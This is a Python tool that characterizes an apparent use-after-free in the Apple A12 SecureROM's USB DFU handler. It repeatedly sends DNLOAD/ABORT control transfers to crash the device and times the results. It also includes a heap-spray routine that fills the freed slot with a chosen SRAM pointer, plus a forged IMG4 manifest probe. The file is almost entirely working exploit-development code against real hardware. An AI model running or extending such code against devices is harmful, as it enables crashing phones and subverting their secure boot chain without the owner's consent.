#!/usr/bin/env python3
"""
A12 SecureROM — DNLOAD/ABORT UAF Characterization
=====================================================
CONFIRMED: 2 cycles of DNLOAD → ABORT crashes the device.
  - Cycle 0: DNLOAD(2048) → ABORT → OK
  - Cycle 1: DNLOAD(2048) → error → device gone

This tool characterizes the exact crash behavior:
  1. How many cycles needed? (always 2, or variable?)
  2. Does payload size matter?
  3. Does adding GET_STATUS between prevent the crash?
  4. Does delay between cycles matter?
  5. Can we control what happens BETWEEN the two cycles?
"""
import sys, time, struct, argparse, json
from datetime import datetime
from pathlib import Path

import usb.core, usb.util, libusb_package, usb.backend.libusb1

APPLE_VID = 0x05AC; DFU_PID = 0x1227

def backend():
    return usb.backend.libusb1.get_backend(find_library=libusb_package.find_library)

def log(msg):
    ts = datetime.now().strftime("%H:%M:%S.%f")[:-3]
    print(f"[{ts}] {msg}", flush=True)

def connect():
    d = usb.core.find(idVendor=APPLE_VID, idProduct=DFU_PID, backend=backend())
    if d:
        try: d.set_configuration()
        except: pass
    return d

def alive():
    try: return usb.core.find(idVendor=APPLE_VID, idProduct=DFU_PID, backend=backend()) is not None
    except: return False

def get_status(d):
    try:
        r = d.ctrl_transfer(0xA1, 3, 0, 0, 6, timeout=2000)
        return {"bStatus": r[0], "bState": r[4]} if len(r) >= 6 else None
    except: return None

def reset_idle(d):
    for _ in range(20):
        st = get_status(d)
        if not st: return False
        if st["bState"] == 2: return True
        if st["bState"] == 10:
            d.ctrl_transfer(0x21, 4, 0, 0, 0, timeout=2000)
        else:
            try: d.ctrl_transfer(0x21, 6, 0, 0, 0, timeout=2000)
            except: pass
        time.sleep(0.05)
    return False

def wait_dfu(timeout_s=120):
    """Wait for device to appear in DFU"""
    log(f"Waiting for DFU device (max {timeout_s}s)...")
    for i in range(timeout_s):
        d = connect()
        if d:
            st = get_status(d)
            if st and st["bState"] == 2:
                log(f"Device found after {i+1}s")
                return d
            if st and st["bState"] == 10:
                d.ctrl_transfer(0x21, 4, 0, 0, 0, timeout=2000)
                time.sleep(0.2)
                return d
        time.sleep(1)
        if i % 10 == 9:
            log(f"  Still waiting... ({i+1}s)")
    log("Timeout waiting for device")
    return None

# ================================================================
# Test functions — each expects a fresh DFU device
# ================================================================

def test_exact_cycle_count(d):
    """
    Exactly how many DNLOAD/ABORT cycles until crash?
    """
    log("\n=== TEST: Exact cycle count ===")
    if not reset_idle(d): return {"error": "no_idle"}
    
    payload = b"\x41" * 2048
    for i in range(20):
        try:
            d.ctrl_transfer(0x21, 1, 0, 0, payload, timeout=2000)
            d.ctrl_transfer(0x21, 6, 0, 0, 0, timeout=500)
        except usb.core.USBError as e:
            log(f"  Cycle {i}: error: {e}")
            if not alive():
                log(f"  >>> CRASH at cycle {i}")
                return {"test": "cycle_count", "crashed_at": i}
            # Device still here, try to recover
            st = get_status(d)
            if st and st["bState"] == 10:
                d.ctrl_transfer(0x21, 4, 0, 0, 0, timeout=2000)
            continue
        
        st = get_status(d)
        if not st:
            if not alive():
                log(f"  >>> CRASH after cycle {i}")
                return {"test": "cycle_count", "crashed_at": i}
        else:
            state = st["bState"]
            if state == 10:
                d.ctrl_transfer(0x21, 4, 0, 0, 0, timeout=2000)
            log(f"  Cycle {i}: OK (state={state})")
    
    log(f"  No crash after 20 cycles!")
    return {"test": "cycle_count", "crashed_at": None}

def test_size_dependency(d, payload_size):
    """Does payload size affect the crash?"""
    log(f"\n=== TEST: Size dependency ({payload_size}B) ===")
    if not reset_idle(d): return {"error": "no_idle"}
    
    payload = b"\x41" * payload_size
    for i in range(10):
        try:
            d.ctrl_transfer(0x21, 1, 0, 0, payload, timeout=2000)
            d.ctrl_transfer(0x21, 6, 0, 0, 0, timeout=500)
        except usb.core.USBError as e:
            if not alive():
                log(f"  {payload_size}B: CRASH at cycle {i}")
                return {"test": "size_dep", "size": payload_size, "crashed_at": i}
        st = get_status(d)
        if st and st["bState"] == 10:
            d.ctrl_transfer(0x21, 4, 0, 0, 0, timeout=2000)

    log(f"  {payload_size}B: survived 10 cycles")
    return {"test": "size_dep", "size": payload_size, "crashed_at": None}

def test_with_get_status(d):
    """Does GET_STATUS between DNLOAD and ABORT prevent the crash?"""
    log(f"\n=== TEST: With GET_STATUS between ===")
    if not reset_idle(d): return {"error": "no_idle"}
    
    payload = b"\x41" * 2048
    for i in range(10):
        try:
            d.ctrl_transfer(0x21, 1, 0, 0, payload, timeout=2000)
            # GET_STATUS before ABORT 
            st = get_status(d)
            log(f"  Cycle {i}: post-DNLOAD state={st['bState'] if st else 'NONE'}")
            d.ctrl_transfer(0x21, 6, 0, 0, 0, timeout=500)
        except usb.core.USBError as e:
            if not alive():
                log(f"  CRASH at cycle {i}")
                return {"test": "with_status", "crashed_at": i}
        st = get_status(d)
        if st and st["bState"] == 10:
            d.ctrl_transfer(0x21, 4, 0, 0, 0, timeout=2000)

    log(f"  Survived 10 cycles with GET_STATUS")
    return {"test": "with_status", "crashed_at": None}

def test_delay_between_cycles(d, delay_ms):
    """Does delay between DNLOAD/ABORT cycles affect crash?"""
    log(f"\n=== TEST: {delay_ms}ms delay between cycles ===")
    if not reset_idle(d): return {"error": "no_idle"}
    
    payload = b"\x41" * 2048
    for i in range(10):
        try:
            d.ctrl_transfer(0x21, 1, 0, 0, payload, timeout=2000)
            d.ctrl_transfer(0x21, 6, 0, 0, 0, timeout=500)
        except usb.core.USBError as e:
            if not alive():
                log(f"  {delay_ms}ms delay: CRASH at cycle {i}")
                return {"test": "delay", "delay_ms": delay_ms, "crashed_at": i}
        
        time.sleep(delay_ms / 1000.0)
        
        st = get_status(d)
        if st and st["bState"] == 10:
            d.ctrl_transfer(0x21, 4, 0, 0, 0, timeout=2000)

    log(f"  {delay_ms}ms delay: survived 10 cycles")
    return {"test": "delay", "delay_ms": delay_ms, "crashed_at": None}

def test_spray_between(d):
    """
    Insert controlled data between the two DNLOAD/ABORT cycles.
    If it's a UAF, whatever we write between cycles might occupy the freed heap slot.
    """
    log(f"\n=== TEST: Heap spray between cycles ===")
    if not reset_idle(d): return {"error": "no_idle"}
    
    payload = b"\x41" * 2048
    
    # Cycle 0: allocate and free
    try:
        d.ctrl_transfer(0x21, 1, 0, 0, payload, timeout=2000)
        d.ctrl_transfer(0x21, 6, 0, 0, 0, timeout=500)
    except usb.core.USBError as e:
        log(f"  Cycle 0 failed: {e}")
        return {"test": "spray_between", "error": str(e)}
    
    # Between cycles: try to allocate controlled data to fill the freed slot
    # Use DNLOAD blocks to spray
    spray = struct.pack("<Q", 0x19C018800) * (256 // 8)  # SRAM pointer spray
    for i in range(5):
        try:
            d.ctrl_transfer(0x21, 1, 0, 0, spray, timeout=2000)
            get_status(d)  # process it
            d.ctrl_transfer(0x21, 6, 0, 0, 0, timeout=500)
        except usb.core.USBError:
            if not alive():
                log(f"  CRASH during spray #{i}")
                return {"test": "spray_between", "crashed_during_spray": True, "at": i}
        st = get_status(d)
        if st and st["bState"] == 10:
            d.ctrl_transfer(0x21, 4, 0, 0, 0, timeout=2000)
    
    # Cycle 1: trigger the UAF with the freed slot now containing our spray
    try:
        d.ctrl_transfer(0x21, 1, 0, 0, payload, timeout=2000)
        d.ctrl_transfer(0x21, 6, 0, 0, 0, timeout=500)
    except usb.core.USBError as e:
        if not alive():
            log(f"  CRASH at trigger cycle (expected)")
            return {"test": "spray_between", "crashed": True, "spray_succeeded": True}
    
    if not alive():
        log(f"  CRASH after trigger")
        return {"test": "spray_between", "crashed": True}
    
    log(f"  Survived (spray might have prevented crash)")
    return {"test": "spray_between", "crashed": False}

def test_dnload_abort_then_manifest(d):
    """
    DNLOAD/ABORT cycle, then send valid-ish DNLOAD + GET_STATUS to trigger manifest.
    Does the corrupted state affect manifest processing?
    """
    log(f"\n=== TEST: DNLOAD/ABORT then manifest ===")
    if not reset_idle(d): return {"error": "no_idle"}
    
    payload = b"\x41" * 2048
    
    # Cycle 0: DNLOAD/ABORT
    try:
        d.ctrl_transfer(0x21, 1, 0, 0, payload, timeout=2000)
        d.ctrl_transfer(0x21, 6, 0, 0, 0, timeout=500)
    except usb.core.USBError:
        if not alive(): return {"test": "then_manifest", "crashed_early": True}
    
    st = get_status(d)
    if st and st["bState"] == 10:
        d.ctrl_transfer(0x21, 4, 0, 0, 0, timeout=2000)
    
    # Now send a real DNLOAD + trigger manifest
    img4 = b"\x30\x82\x10\x00\x16\x04IMG4" + b"\x00" * 500
    try:
        d.ctrl_transfer(0x21, 1, 0, 0, img4, timeout=2000)
        # GET_STATUS to trigger processing
        t0 = time.perf_counter()
        st = get_status(d)
        t1 = time.perf_counter()
        dt = (t1 - t0) * 1000
        log(f"  After DNLOAD/ABORT + manifest: state={st['bState'] if st else 'NONE'}, time={dt:.1f}ms")
        
        if st and st["bState"] == 4:
            # Wait for processing
            time.sleep(4)
            st2 = get_status(d)
            log(f"  After wait: state={st2['bState'] if st2 else 'NONE'}")
            return {"test": "then_manifest", "crashed": False, "process_time": dt, "final_state": st2["bState"] if st2 else None}
        
        return {"test": "then_manifest", "crashed": False, "state": st["bState"] if st else None}
    except usb.core.USBError as e:
        if not alive():
            log(f"  CRASH during manifest after DNLOAD/ABORT!")
            return {"test": "then_manifest", "crashed_at_manifest": True}
        return {"test": "then_manifest", "error": str(e)}

# ================================================================

def main():
    p = argparse.ArgumentParser()
    p.add_argument("--test", default="all", 
                   choices=["all", "cycles", "sizes", "status", "delays", "spray", "manifest"])
    p.add_argument("--auto-wait", action="store_true", help="Auto-wait for DFU after crash")
    args = p.parse_args()

    log("=" * 60)
    log("A12 DNLOAD/ABORT UAF Characterization")
    log("=" * 60)

    results = []
    
    def run_test(name, fn, *a):
        d = connect()
        if not d:
            if args.auto_wait:
                d = wait_dfu(90)
            if not d:
                log(f"No device for test {name}")
                return
        reset_idle(d)
        r = fn(d, *a) if a else fn(d)
        r["_name"] = name
        results.append(r)
        log(f"  Result: {r}")

    if args.test in ("all", "cycles"):
        run_test("cycle_count", test_exact_cycle_count)

    if args.test in ("all", "sizes"):
        for sz in [64, 256, 512, 1024, 2048, 4096]:
            run_test(f"size_{sz}", test_size_dependency, sz)

    if args.test in ("all", "status"):
        run_test("with_get_status", test_with_get_status)

    if args.test in ("all", "delays"):
        for delay in [0, 10, 50, 100, 500]:
            run_test(f"delay_{delay}ms", test_delay_between_cycles, delay)

    if args.test in ("all", "spray"):
        run_test("spray_between", test_spray_between)

    if args.test in ("all", "manifest"):
        run_test("then_manifest", test_dnload_abort_then_manifest)

    # Save
    outf = Path(__file__).parent / "results" / "uaf_characterization.json"
    outf.parent.mkdir(exist_ok=True)
    with open(outf, "w") as f:
        json.dump({"timestamp": datetime.now().isoformat(), "results": results}, f, indent=2)
    log(f"\nSaved: {outf}")

if __name__ == "__main__":
    main()
